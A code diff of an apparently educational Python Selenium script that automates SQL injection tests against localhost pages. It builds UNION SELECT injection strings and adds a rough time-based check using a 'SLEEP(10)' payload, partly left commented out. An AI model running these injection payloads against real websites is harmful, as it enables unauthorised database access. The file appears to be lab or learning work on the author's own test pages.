@@ -2,13 +2,18 @@
 
 #Grund Problem bei allem, wie viel darf vorgegeben werden?
 import time
-
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from colorama import init, Fore, Style
 from bs4 import BeautifulSoup
+import time
 
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+
+import threading
 
 #für die Farben
 init()
@@ -134,6 +139,32 @@ def unionAttackOnTable(url, extraColumns, id):
     injectionString = '" UNION SELECT ' + fillerString + ' "INJECTIONPOSIBLE"# '
     result = goToWebsiteAndInsert(url, id, injectionString)
     print(checkIfInjectionIsSuccessful(result))
+""" TImmer injection """
+def timmerAttack(url, id):
+    delayTime = 8                                       #seconds which are delay from thread
+    thread = threading.Thread(target=check_website, args=(url,id))
+    start_time = time.perf_counter()
+    thread.start()
+    thread.join()
+    elapsed_time = time.perf_counter() - start_time
+    if(elapsed_time > 18):
+        print("INJECTION möglich!")
+    else:
+        pass
+
+def check_website(url,id):
+    driver = webdriver.Chrome()
+    driver.get(url)
+    input_field = driver.find_element(By.ID, id)
+    #input_field.send_keys("1 AND SLEEP(10)=0;")
+    input_field.send_keys("1")
+    input_field.send_keys(Keys.RETURN)
+    driver.quit()
+"""
+    injectionString = "1 AND SLEEP(10)=0;"
+    goToWebsiteAndInsert(url, id, injectionString)
+"""
+
 """
 url = "http://localhost:8000/Views/indexView.php"
 #url = "http://localhost:8000/indexWebshop.php"
@@ -176,6 +207,8 @@ driver.get(url)
 time.sleep(5)
 unionAttackOnTable(url,2)
 """
+
+"""
 url1 = "http://localhost:8000/Views/indexView.php"
 url2 = "http://localhost:8000/indexWebshop.php"
 
@@ -215,3 +248,5 @@ try:
         print("Die zweite website konnte erfolgreich injectet werden!")
 except:
     pass
+"""
+timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")
